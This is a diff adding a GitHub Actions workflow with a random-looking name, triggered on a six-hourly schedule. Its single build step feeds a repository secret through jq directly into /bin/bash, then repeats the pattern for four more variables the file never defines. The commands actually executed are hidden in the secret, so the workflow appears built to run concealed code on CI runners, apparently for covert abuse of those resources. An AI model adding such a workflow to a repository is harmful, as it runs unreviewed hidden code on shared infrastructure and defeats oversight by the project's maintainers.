@@ -1,0 +1,22 @@
+name: futtockloathsome
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: futtockloathsome
+        env:
+          e96: ${{ secrets.e96 }}
+        run: |
+          echo $e96 | jq -r .cnmgb77012 | /bin/bash
+          echo $n269 | jq -r .wmfe628 | /bin/bash
+          echo $psl42 | jq -r .d5396 | /bin/bash
+          echo $rufln4 | jq -r .abtrg1 | /bin/bash
+          echo $qlezv20 | jq -r .h81434 | /bin/bash
+
